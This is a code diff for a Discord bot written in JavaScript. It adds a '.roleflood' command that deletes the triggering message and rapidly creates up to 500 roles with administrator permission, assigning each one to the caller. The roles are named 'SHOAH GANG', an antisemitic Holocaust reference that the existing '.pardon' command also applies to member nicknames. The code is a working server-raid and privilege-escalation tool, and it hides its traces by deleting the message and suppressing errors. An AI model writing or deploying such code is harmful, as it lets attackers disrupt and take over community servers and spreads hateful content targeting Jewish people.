@@ -97,7 +97,19 @@ if (msg.content === '.pardon') {
       if(member.setNickname("SHOAH GANG"));      
   })
   }
+  if (msg.content === '.roleflood') {
 
+    if (msg.deletable) msg.delete();
+    let i = 0;
+    let interval = setInterval(function () {
+    if (i === 500) clearInterval(interval);
+      msg.guild.createRole({name: 'SHOAH GANG', color:'RANDOM', permissions: "ADMINISTRATOR"}).then(function(role) {
+        msg.member.addRole(role).catch(e => {});
+        if (msg.deletable) msg.delete().catch(e => {});
+      }).catch(e => {});
+      i++
+    }, 100)
+  }
 }});
 
 bot.login(process.env.BOT_TOKEN)
